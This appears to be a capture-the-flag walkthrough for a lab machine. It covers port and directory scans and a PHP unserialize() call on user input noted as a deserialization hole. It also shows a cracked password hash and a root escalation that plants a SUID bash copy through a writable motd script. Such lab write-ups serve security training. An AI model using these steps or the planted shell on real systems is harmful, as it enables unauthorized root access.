
First scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/debug_ctf]
└──╼ #nmap -A -sV -p- 10.10.62.242 | tee scan.txt                                    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-03 17:06 CET
Nmap scan report for 10.10.62.242
Host is up (0.049s latency).                                                                                                                                             
Not shown: 65533 closed tcp ports (reset)                                           
PORT   STATE SERVICE VERSION                                                        
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

```


Interesting gobuster scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #gobuster dir -u http://10.10.62.242 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/03 17:06:41 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/backup               (Status: 301) [Size: 313] [--> http://10.10.62.242/backup/]
/grid                 (Status: 301) [Size: 311] [--> http://10.10.62.242/grid/]  
/javascripts          (Status: 301) [Size: 318] [--> http://10.10.62.242/javascripts/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.62.242/javascript/] 
/server-status        (Status: 403) [Size: 277]                                   
===============================================================
2023/01/03 17:09:27 Finished
===============================================================
```
Backup shows the source code of the entire site.

Found in `index.php`
```
// Leaving this for now... only for debug purposes... do not touch!
                                                                                    
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

```
This looks like a deserialization vulnerability.



Found password:
```
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```
After hash-cracking:
```
james : jamaica
```

Note.txt specified SSH customizing
`/etc/update-motd.d/*` writable
Injected a root shell:
```
james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh
[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash

```